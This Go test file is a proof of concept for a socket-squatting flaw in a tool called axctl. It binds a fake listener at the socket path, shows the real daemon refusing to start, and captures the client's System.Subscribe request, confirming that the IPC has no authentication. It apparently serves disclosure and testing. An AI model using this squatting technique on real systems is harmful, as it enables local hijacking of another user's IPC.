//go:build linux

// PoC: axctl trusts whatever listens on the fixed /tmp/axctl-<uid>.sock path
// (main.go:193). No peer-credential check exists. A squatter binds the path
// first: "axctl daemon" prints "already running" and exits, and "axctl
// subscribe" hands System.Subscribe to the squatter.
//
// Runs the real binary against a fake listener and never touches the live
// socket. Run: AXCTL_REPO=/path/to/axctl go test axctl_squat_test.go -v

package squat

import (
	"encoding/json"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestAxctlClientTrustsSquattedSocket(t *testing.T) {
	repo := os.Getenv("AXCTL_REPO")
	if repo == "" {
		repo = "/home/bnn/projects/axctl"
	}
	if _, err := os.Stat(filepath.Join(repo, "main.go")); err != nil {
		t.Skipf("axctl repo not found at %q; set AXCTL_REPO", repo)
	}

	bin := filepath.Join(t.TempDir(), "axctl")
	build := exec.Command("go", "build", "-o", bin, ".")
	build.Dir = repo
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build axctl: %v: %s", err, out)
	}

	sock := filepath.Join(t.TempDir(), "axctl.sock")
	listener, err := net.Listen("unix", sock)
	if err != nil {
		t.Fatal(err)
	}
	defer listener.Close()

	requests := make(chan string, 4)
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				return
			}
			var req struct {
				ID     int    `json:"id"`
				Method string `json:"method"`
			}
			err = json.NewDecoder(conn).Decode(&req)
			json.NewEncoder(conn).Encode(map[string]any{"id": 1, "error": "squatted"})
			conn.Close()
			if err == nil && req.Method != "" {
				requests <- req.Method
				listener.Close()
				return
			}
		}
	}()

	env := append(os.Environ(), "AXCTL_SOCKET="+sock)

	daemon := exec.Command(bin, "daemon")
	daemon.Env = env
	daemonOut, err := daemon.CombinedOutput()
	if err == nil {
		t.Skipf("daemon started cleanly (no compositor in this context): %s", daemonOut)
	}
	if !strings.Contains(string(daemonOut), "already running") {
		t.Skipf("daemon exited before the socket probe: %s", daemonOut)
	}
	t.Logf("hijack: real daemon refused to start: %s", strings.TrimSpace(string(daemonOut)))

	subscribe := exec.Command(bin, "subscribe")
	subscribe.Env = env
	subscribe.Start()
	select {
	case method := <-requests:
		if method != "System.Subscribe" {
			t.Fatalf("squatter received %q, want System.Subscribe", method)
		}
		t.Logf("squatter received the client's request: %s", method)
		subscribe.Process.Kill()
		subscribe.Wait()
	case <-time.After(5 * time.Second):
		t.Fatal("squatter received no request; client did not dial the path")
	}

	t.Log("CONFIRMED: axctl sends its IPC requests to whatever holds the fixed /tmp path; no authentication anywhere")
}
